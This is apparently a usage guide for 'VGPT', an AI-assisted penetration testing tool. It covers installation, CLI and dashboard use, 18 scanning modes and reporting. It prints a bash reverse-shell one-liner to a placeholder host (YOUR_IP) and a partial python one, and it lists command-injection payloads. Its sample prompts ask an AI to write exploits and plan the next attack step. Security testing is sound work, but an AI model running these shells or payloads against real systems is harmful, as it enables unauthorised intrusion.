VGPT - Vulnerability GPT (Ultimate Edition) - Complete Usage Guide
VGPT is a comprehensive penetration testing framework combining 18 testing modes, AI integration, persistent findings database, web dashboard, and exploit generation. Here's how to use every feature:

🚀 1. Installation & Prerequisites
bash



# Clone/download the script
chmod +x vgpt.py
pip install -r requirements.txt  # Or install manually:
pip install flask flask-socketio rich nmap python-nmap requests reportlab ollama
Optional AI (recommended):

bash



# Install Ollama + Llama3 model
curl -fsSL https://ollama.ai/install.sh | sh
ollama pull llama3
🎯 2. Quick Start Commands
bash



# CLI Mode (default - most powerful)
python3 vgpt.py

# Web Dashboard (browser UI)
python3 vgpt.py --dashboard

# Direct scan (non-interactive)
python3 vgpt.py --target 10.0.0.1 --mode 2
python3 vgpt.py --target example.com --mode 18  # Advanced Red Team
🖥️ 3. CLI Interface (Primary Usage)
Natural Language Parsing - Just type what you want:




vgpt> scan 10.0.0.1
vgpt> recon example.com
vgpt> sql injection test http://target.com/login
vgpt> port scan 192.168.1.0/24
vgpt> ai how do I exploit CVE-2023-1234?
vgpt> exploit
vgpt> report
vgpt> quit
CLI Commands:

scan/recon target → Basic recon + ports
ai/chat your question → AI pentest assistant
exploit → Generate reverse shells
report → HTML report generation
quit/q/exit → Exit
📊 4. The 18 Testing Modes (Full Coverage)


Mode	Name	What it does
1	Basic Recon	OSINT, DNS enum, basic fingerprinting
2	Port Scanning	Full nmap -sS -sV -O -p- --script vuln
3	Service Enumeration	Detailed service version detection
4	Vuln Scanning	NSE vuln scripts + custom checks
5	Web Recon	Web tech stack, headers, robots.txt
6	Directory Fuzzing	Brute force common directories
7	SQL Injection	OWASP payloads + error detection
8	XSS Testing	Reflected/stored XSS payloads
9	Command Injection	; ls, && id, backticks, etc.
10	SSRF Testing	Metadata endpoints, localhost
11	XXE Testing	XML entity payloads
12	Auth Bypass	Common bypass techniques
13	Privilege Escalation	Linux/Windows priv esc checks
14	Lateral Movement	SMB, WinRM, SSH enumeration
15	CTF Mode	CTF-specific workflows
16	Bug Bounty	Report-friendly findings
17	Red Team	MITRE ATT&CK mapping
18	Advanced Red Team	OWASP Top 10 + MITRE + CVSS + Exploit chains
Pro Tip: Mode 18 runs comprehensive OWASP Top 10 + MITRE ATT&CK mapping with CVSS scoring.

🌐 5. Web Dashboard (http://localhost:5000)
Features:




[Sidebar Controls]
├── Target input (IP/Domain/URL)
├── Mode selector (1-18)
├── 🚀 Run Scan
├── 💣 Generate Exploit  
├── 📊 Download Report
└── 🤖 AI Chat (live)

[Main Panel]
├── 📋 Recent Findings (persistent DB)
└── 📈 Live Status (real-time updates)
Real-time updates via Socket.IO - Watch scans live in browser!

🔍 6. Key Features Explained
Persistent Findings Database



# All findings auto-saved to vgpt_findings.db
# View anytime: GET /api/findings
# Columns: timestamp, target, mode, severity, title, description, evidence, cvss_score
AI Chat Integration



vgpt> ai explain SSRF exploitation chain
vgpt> ai write python exploit for log4shell
vgpt> ai what's my next attack vector after RCE?
Uses Ollama/llama3 locally
All conversations saved to DB
Context-aware pentesting advice
Exploit Generation



vgpt> exploit
# Generates reverse shells in:
- bash    ✓
- python  ✓  
- php     ✓
- perl    ✓
- ruby    ✓
- netcat  ✓
API Example:

bash



curl -X POST http://localhost:5000/api/generate_exploit -d '{"ip":"YOUR_IP"}'
Reporting



vgpt> report
# Generates report.html (auto-opens in browser)
# Features: CVSS scores, evidence, remediation
# PDF: pip install reportlab
🛠️ 7. Advanced Workflows
Autonomous Mode (Full Chain)
bash



python3 vgpt.py --target target.com --autonomous
# Runs ALL 18 modes automatically!
Custom API Usage
python



import requests
response = requests.post('http://localhost:5000/api/scan', 
                        json={'target':'10.0.0.1', 'mode':18})
OWASP Top 10 Coverage
Mode 18 automatically tests:




A01 Broken Access Control
A02 Crypto Failures  
A03 Injection (SQLi, Cmd Inj, etc.)
A04 Insecure Design
A05 Security Misconfig
A06 Vulnerable Components
A07 Auth Failures
A08 Integrity Failures
A09 Logging Failures
A10 Supply Chain
📈 8. Output Examples
Port Scan Results:




Mode 2: Port Scanning
┌─────────────┬──────────┬──────────┐
│ Severity    │ Finding  │
├─────────────┼──────────┼──────────┤
│ HIGH        │ 22/tcp   │ ssh      │
│ HIGH        │ 80/tcp   │ http     │
│ HIGH        │ 443/tcp  │ https    │
└─────────────┴──────────┴──────────┘
Exploit Output:




[bold red]Reverse Shells:[/bold red]
[yellow]bash:[/yellow] bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
[yellow]python:[/yellow] python3 -c 'import socket,subprocess...connect(("YOUR_IP",4444))...'
⚠️ 9. Troubleshooting



Error: nmap not found → sudo apt install nmap
Error: Ollama not available → pip install ollama + ollama pull llama3
Error: PDF reports → pip install reportlab
Port 5000 busy → Kill existing flask processes
No findings? → Check vgpt_findings.db
🎓 10. Pro Tips
Start with Mode 1-3 for recon, then Mode 18 for full attack surface
Always use --dashboard for team collaboration
Enable Ollama for AI-powered next-step recommendations
Database persists across runs - review old findings with report
Natural language works best - "scan web app for sql injection" → auto Mode 7
VGPT combines Nmap + OWASP ZAP + Burp + Metasploit + AI in one tool!
